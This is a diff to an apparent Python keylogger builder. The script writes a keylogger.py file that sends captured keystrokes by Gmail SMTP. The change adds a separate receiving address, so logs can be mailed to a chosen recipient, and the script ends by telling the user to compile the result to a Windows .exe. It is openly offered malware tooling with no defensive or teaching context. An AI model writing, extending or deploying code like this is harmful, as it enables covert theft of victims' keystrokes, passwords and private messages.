@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 import io
 import os 
-def generate(usuario,password):
+def generate(usuario,password,email1):
 	with io.FileIO("keylogger.py", "w") as file:
 		file.write('''
 #!/bin/usr/python
@@ -42,7 +42,7 @@ def sendmail():
     gmail_user = "'''+usuario+'''"
     gmail_password = "'''+password+'''"
     FROM =gmail_user
-    TO = "'''+usuario+'''"
+    TO = "'''+email1+'''"
     SUBJECT= "key" 
 
         
@@ -126,8 +126,10 @@ usuario = raw_input(bcolors.GREEN+"Enter your email: "+bcolors.ENDC)
 
 password = raw_input(bcolors.GREEN+"Enter your password: "+bcolors.ENDC)
 
+email1 = raw_input(bcolors.GREEN+"Enter your email receive: "+bcolors.ENDC)
+
 print bcolors.YELLOW+"\nYour keylogger is ready, compile it to .exe in a Windows machine."+bcolors.ENDC
 
-generate(usuario,password)
+generate(usuario,password,email1)
 info()
 
